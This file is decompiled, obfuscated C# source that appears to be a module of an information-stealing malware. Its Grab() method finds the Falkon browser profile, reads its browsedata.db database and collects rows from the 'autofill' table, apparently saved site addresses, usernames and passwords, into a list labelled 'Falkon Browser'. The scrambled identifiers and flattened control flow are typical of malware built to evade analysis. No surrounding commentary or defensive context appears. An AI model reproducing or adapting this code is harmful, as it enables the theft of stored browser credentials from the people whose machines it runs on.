using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using _81d;
using p3N5Y;

namespace ZAZUx;

public class H80EA83 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string WmNpdR0i
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public H80EA83()
	{
		WmNpdR0i = "Falkon Browser";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string text = default;
		List<ii68> list = default;
		_5bBC obj = default;
		do
		{
			if (num == 6)
			{
				goto IL_001f;
			}
			if (num == 2)
			{
				text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\falkon\\profiles\\";
				num = 3;
			}
			if (num == 4)
			{
				if (File.Exists(text + "profiles.ini"))
				{
					goto IL_001f;
				}
				num = 5;
			}
			if (num == 7)
			{
				goto IL_014b;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 3)
			{
				if (!Directory.Exists(text))
				{
					goto IL_02af;
				}
				num = 4;
			}
			switch (num)
			{
			case 5:
				break;
			case 0:
				num = 1;
				continue;
			default:
				continue;
			}
			goto IL_02af;
			IL_014b:
			for (int i = 0; i <= obj.FtN5geM() - 1; i++)
			{
				try
				{
					string text2 = obj.gzd4rqxbTqm(i, 1);
					string text3 = obj.gzd4rqxbTqm(i, 4);
					string text4 = obj.gzd4rqxbTqm(i, 3);
					if (!string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
					{
						list.Add(new ii68
						{
							byIdLuuGZbL = text2,
							S8v = text3,
							_9H5rP7hg2 = text4,
							oVAe = WmNpdR0i
						});
					}
				}
				catch
				{
				}
			}
			return list;
			IL_02af:
			return list;
			IL_001f:
			string value = new Regex("startProfile=([A-z0-9\\/\\.\\\"]+)").Match(File.ReadAllText(text + "profiles.ini")).Groups[1].Value;
			string baseName = text + value.Trim(new char[1] { '"' }) + "\\browsedata.db";
			try
			{
				obj = new _5bBC(baseName);
			}
			catch
			{
				return list;
			}
			if (!obj.ga9("autofill"))
			{
				return list;
			}
			goto IL_014b;
		}
		while (num != 8);
		List<ii68> result = default;
		return result;
	}
}
